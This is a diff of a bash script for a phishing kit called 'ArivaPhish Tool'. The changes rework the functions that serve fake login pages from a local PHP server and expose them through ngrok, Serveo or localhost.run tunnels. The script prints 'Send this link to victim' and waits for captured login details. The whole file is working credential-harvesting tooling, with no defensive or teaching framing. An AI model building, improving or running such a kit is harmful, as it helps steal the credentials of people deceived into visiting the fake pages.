@@ -8,7 +8,6 @@
 
 trap 'printf "\n";stop;exit 1' 2
 
-# Install dependencies before running the tool
 install_dependencies() {
     printf "\e[1;92m📦 Installing required packages...\e[0m\n"
     sleep 1
@@ -18,14 +17,12 @@ install_dependencies() {
     sleep 1
 }
 
-# Check for dependencies
 dependencies() {
     for cmd in php curl ssh unzip; do
         command -v $cmd > /dev/null 2>&1 || { echo >&2 "$cmd is not installed! Install it."; exit 1; }
     done
 }
 
-# Simple login system with password "ariva"
 login() {
     clear
     printf "\e[1;94m🔒 Welcome to ArivaPhish Tool 🔒\e[0m\n"
@@ -266,15 +263,15 @@ vk() {
 stop() {
     for proc in ngrok php ssh; do
         if ps aux | grep -q "[${proc:0:1}]${proc:1}"; then
-            pkill -f -2 $proc > /dev/null 2>&1
-            killall -2 $proc > /dev/null 2>&1
+            pkill -f -2 "$proc" > /dev/null 2>&1
+            killall -2 "$proc" > /dev/null 2>&1
         fi
     done
-    rm -f linksender
+    rm -f linksender 2>/dev/null
 }
 
 start() {
-    rm -f linksender
+    rm -f linksender 2>/dev/null
     printf "\n"
     printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m 🖥️ LocalHost\e[0m\n"
     printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m 🌐 Ngrok.io\e[0m\n"
@@ -282,139 +279,210 @@ start() {
     printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m 🏃 Localhost.run\e[0m\n"
     d_o_server="2"
     printf "\n"
-    read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port Forwarding option: \e[0m\e[1;96m' option_server
+    read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port Forwarding option (default 2): \e[0m\e[1;96m' option_server
     option_server="${option_server:-${d_o_server}}"
     case $option_server in
-        3|03) start_serveo ;;
-        2|02) start_ngrok ;;
-        4|04) start_localhost_run ;;
         1|01) start_localhost ;;
+        2|02) start_ngrok ;;
+        3|03) start_serveo ;;
+        4|04) start_localhost_run ;;
         *)
             printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m❌ Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
             sleep 1
-            banner
             start
             ;;
     esac
 }
 
-start_serveo() {
-    clean_files
+start_localhost() {
     def_port="5555"
-    printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
-    read port
+    printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' "$def_port"
+    read -p "" port
     port="${port:-${def_port}}"
+    if ! [[ "$port" =~ ^[0-9]+$ ]] || [ "$port" -lt 1024 ] || [ "$port" -gt 65535 ]; then
+        printf "\e[1;91m❌ Invalid port number! Must be between 1024-65535\e[0m\n"
+        sleep 1
+        start_localhost
+        return
+    fi
     printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m 🌍 Initializing ... \e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
-    cd sites/$server || { printf "\e[1;91m❌ Directory sites/$server not found!\e[0m\n"; exit 1; }
-    php -S 127.0.0.1:$port > /dev/null 2>&1 &
+    if [ ! -d "sites/$server" ]; then
+        printf "\e[1;91m❌ Directory sites/$server not found! Check your setup.\e[0m\n"
+        sleep 2
+        phish_menu
+        return
+    fi
+    cd "sites/$server" || return
+    php -S 127.0.0.1:"$port" > /dev/null 2>&1 &
     php_pid=$!
     sleep 2
-    if ! ps -p $php_pid > /dev/null; then
-        printf "\e[1;91m❌ PHP server failed to start on port $port!\e[0m\n"
-        exit 1
+    if ! ps -p "$php_pid" > /dev/null 2>&1; then
+        printf "\e[1;91m❌ Failed to start PHP server on port $port! Port might be in use.\e[0m\n"
+        sleep 2
+        phish_menu
+        return
     fi
-    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m 🚀 Launching Serveo ...\e[0m\n"
-    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:$port serveo.net > linksender 2> /dev/null &
-    ssh_pid=$!
-    sleep 7
-    if ! ps -p $ssh_pid > /dev/null; then
-        printf "\e[1;91m❌ SSH connection to Serveo failed!\e[0m\n"
-        exit 1
-    fi
-    send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" linksender)
-    if [[ -z "$send_url" ]]; then
-        printf "\e[1;91m❌ Failed to retrieve Serveo link! Check network or Serveo status.\e[0m\n"
-        exit 1
-    fi
-    printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m 📲 Send the link to victim:\e[0m\e[1;93m %s \n' "$send_url"
+    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m ✅ Successfully Hosted at:\e[0m\e[1;93m http://localhost:$port\e[0m\n"
     found
 }
 
 start_ngrok() {
     clean_files
-    if [[ ! -e ngrok ]]; then
-        printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m 🌍 Initializing Ngrok ...\e[0m\n"
+    if [ ! -x "./ngrok" ]; then
+        printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m 📥 Downloading Ngrok ...\e[0m\n"
         arch=$(uname -m)
-        if [[ "$arch" == *"arm"* ]]; then
-            curl -sL https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip -o ngrok.zip || { printf "\e[1;91m❌ Ngrok download failed!\e[0m\n"; exit 1; }
-        else
-            curl -sL https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip -o ngrok.zip || { printf "\e[1;91m❌ Ngrok download failed!\e[0m\n"; exit 1; }
+        case "$arch" in
+            *arm*) curl -sL "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip" -o ngrok.zip ;;
+            *aarch64*) curl -sL "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip" -o ngrok.zip ;;
+            *) curl -sL "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.zip" -o ngrok.zip ;;
+        esac
+        if [ ! -f "ngrok.zip" ]; then
+            printf "\e[1;91m❌ Ngrok download failed! Check your internet connection.\e[0m\n"
+            sleep 2
+            phish_menu
+            return
         fi
-        unzip ngrok.zip > /dev/null 2>&1 && chmod +x ngrok && rm ngrok.zip || { printf "\e[1;91m❌ Ngrok setup failed!\e[0m\n"; exit 1; }
+        unzip ngrok.zip > /dev/null 2>&1 && chmod +x ngrok && rm ngrok.zip || {
+            printf "\e[1;91m❌ Ngrok setup failed!\e[0m\n"
+            sleep 2
+            phish_menu
+            return
+        }
     fi
-    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m 🚀 Launching Ngrok ...\e[0m\n"
-    cd sites/$server || { printf "\e[1;91m❌ Directory sites/$server not found!\e[0m\n"; exit 1; }
+    if [ ! -d "sites/$server" ]; then
+        printf "\e[1;91m❌ Directory sites/$server not found! Check your setup.\e[0m\n"
+        sleep 2
+        phish_menu
+        return
+    fi
+    cd "sites/$server" || return
+    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m 🚀 Launching Ngrok on port 5555 ...\e[0m\n"
     php -S 127.0.0.1:5555 > /dev/null 2>&1 &
     php_pid=$!
     sleep 2
-    if ! ps -p $php_pid > /dev/null; then
+    if ! ps -p "$php_pid" > /dev/null 2>&1; then
         printf "\e[1;91m❌ PHP server failed to start on port 5555!\e[0m\n"
-        exit 1
+        sleep 2
+        phish_menu
+        return
     fi
-    ./ngrok http 5555 > /dev/null 2>&1 &
+    ./ngrok http 5555 --log=stdout > ngrok.log 2>&1 &
     ngrok_pid=$!
     sleep 10
-    if ! ps -p $ngrok_pid > /dev/null; then
-        printf "\e[1;91m❌ Ngrok failed to start!\e[0m\n"
-        exit 1
+    if ! ps -p "$ngrok_pid" > /dev/null 2>&1; then
+        printf "\e[1;91m❌ Ngrok failed to start! Check logs in ngrok.log\e[0m\n"
+        sleep 2
+        phish_menu
+        return
     fi
-    link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-    if [[ -z "$link" ]]; then
-        printf "\e[1;91m❌ Failed to retrieve Ngrok link! Check network or Ngrok status.\e[0m\n"
-        exit 1
+    link=$(grep -o "https://[0-9a-z-]*\.ngrok-free.app" ngrok.log)
+    if [ -z "$link" ]; then
+        printf "\e[1;91m❌ Failed to get Ngrok URL! Check ngrok.log for errors.\e[0m\n"
+        sleep 2
+        phish_menu
+        return
     fi
-    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m 📲 Send the link to victim:\e[0m\e[1;93m %s \n" "$link"
+    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m 📲 Send this link to victim:\e[0m\e[1;93m %s \n" "$link"
+    found
+}
+
+start_serveo() {
+    clean_files
+    def_port="5555"
+    printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' "$def_port"
+    read -p "" port
+    port="${port:-${def_port}}"
+    if ! [[ "$port" =~ ^[0-9]+$ ]] || [ "$port" -lt 1024 ] || [ "$port" -gt 65535 ]; then
+        printf "\e[1;91m❌ Invalid port number! Must be between 1024-65535\e[0m\n"
+        sleep 1
+        start_serveo
+        return
+    fi
+    if [ ! -d "sites/$server" ]; then
+        printf "\e[1;91m❌ Directory sites/$server not found! Check your setup.\e[0m\n"
+        sleep 2
+        phish_menu
+        return
+    fi
+    cd "sites/$server" || return
+    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m 🌍 Initializing Serveo ... \e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
+    php -S 127.0.0.1:"$port" > /dev/null 2>&1 &
+    php_pid=$!
+    sleep 2
+    if ! ps -p "$php_pid" > /dev/null 2>&1; then
+        printf "\e[1;91m❌ PHP server failed to start on port $port!\e[0m\n"
+        sleep 2
+        phish_menu
+        return
+    fi
+    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m 🚀 Launching Serveo ...\e[0m\n"
+    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:"$port" serveo.net > linksender 2>/dev/null &
+    ssh_pid=$!
+    sleep 7
+    if ! ps -p "$ssh_pid" > /dev/null 2>&1; then
+        printf "\e[1;91m❌ Serveo SSH tunnel failed to start!\e[0m\n"
+        sleep 2
+        phish_menu
+        return
+    fi
+    send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" linksender)
+    if [ -z "$send_url" ]; then
+        printf "\e[1;91m❌ Failed to get Serveo URL! Service might be down.\e[0m\n"
+        sleep 2
+        phish_menu
+        return
+    fi
+    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m 📲 Send this link to victim:\e[0m\e[1;93m %s \n" "$send_url"
     found
 }
 
 start_localhost_run() {
     clean_files
     def_port="5555"
-    printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
-    read port
+    printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' "$def_port"
+    read -p "" port
     port="${port:-${def_port}}"
-    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m 🌍 Initializing ... \e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
-    cd sites/$server || { printf "\e[1;91m❌ Directory sites/$server not found!\e[0m\n"; exit 1; }
-    php -S 127.0.0.1:$port > /dev/null 2>&1 &
+    if ! [[ "$port" =~ ^[0-9]+$ ]] || [ "$port" -lt 1024 ] || [ "$port" -gt 65535 ]; then
+        printf "\e[1;91m❌ Invalid port number! Must be between 1024-65535\e[0m\n"
+        sleep 1
+        start_localhost_run
+        return
+    fi
+    if [ ! -d "sites/$server" ]; then
+        printf "\e[1;91m❌ Directory sites/$server not found! Check your setup.\e[0m\n"
+        sleep 2
+        phish_menu
+        return
+    fi
+    cd "sites/$server" || return
+    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m 🌍 Initializing Localhost.run ... \e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
+    php -S 127.0.0.1:"$port" > /dev/null 2>&1 &
     php_pid=$!
     sleep 2
-    if ! ps -p $php_pid > /dev/null; then
+    if ! ps -p "$php_pid" > /dev/null 2>&1; then
         printf "\e[1;91m❌ PHP server failed to start on port $port!\e[0m\n"
-        exit 1
+        sleep 2
+        phish_menu
+        return
     fi
-    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m 🏃 Launching Localhost.run ...\e[0m\n"
-    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m ⚠️ Ctrl + C to view Login Info.\e[0m\n"
-    ssh -R 80:localhost:$port ssh.localhost.run > linksender 2>&1 &
+    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m 🚀 Launching Localhost.run ...\e[0m\n"
+    ssh -R 80:localhost:"$port" ssh.localhost.run > linksender 2>&1 &
     ssh_pid=$!
     sleep 7
-    if ! ps -p $ssh_pid > /dev/null; then
-        printf "\e[1;91m❌ SSH connection to Localhost.run failed!\e[0m\n"
-        exit 1
+    if ! ps -p "$ssh_pid" > /dev/null 2>&1; then
+        printf "\e[1;91m❌ Localhost.run SSH tunnel failed to start!\e[0m\n"
+        sleep 2
+        phish_menu
+        return
     fi
     send_url=$(grep -o "https://[0-9a-z-]*\.localhost.run" linksender)
-    if [[ -z "$send_url" ]]; then
-        printf "\e[1;91m❌ Failed to retrieve Localhost.run link! Check network or SSH status.\e[0m\n"
-        exit 1
+    if [ -z "$send_url" ]; then
+        printf "\e[1;91m❌ Failed to get Localhost.run URL! Service might be down.\e[0m\n"
+        sleep 2
+        phish_menu
+        return
     fi
-    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m 📲 Send the link to victim:\e[0m\e[1;93m %s \n" "$send_url"
-    found
-}
-
-start_localhost() {
-    def_port="5555"
-    printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
-    read port
-    port="${port:-${def_port}}"
-    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m 🌍 Initializing ... \e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
-    cd sites/$server || { printf "\e[1;91m❌ Directory sites/$server not found!\e[0m\n"; exit 1; }
-    php -S 127.0.0.1:$port > /dev/null 2>&1 &
-    php_pid=$!
-    sleep 2
-    if ! ps -p $php_pid > /dev/null; then
-        printf "\e[1;91m❌ PHP server failed to start on port $port!\e[0m\n"
-        exit 1
-    fi
-    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m ✅ Successfully Hosted at:\e[0m\e[1;93m http://localhost:$port\e[0m\n"
+    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m 📲 Send this link to victim:\e[0m\e[1;93m %s \n" "$send_url"
     found
 }
 
@@ -460,7 +528,6 @@ c_cred() {
     printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m ⏳ Waiting for Next Login Info, Press \e[0m\e[1;96mCtrl + C \e[1;93mto exit ...\e[0m\n"
 }
 
-# Start the tool
 install_dependencies
 login
 banner
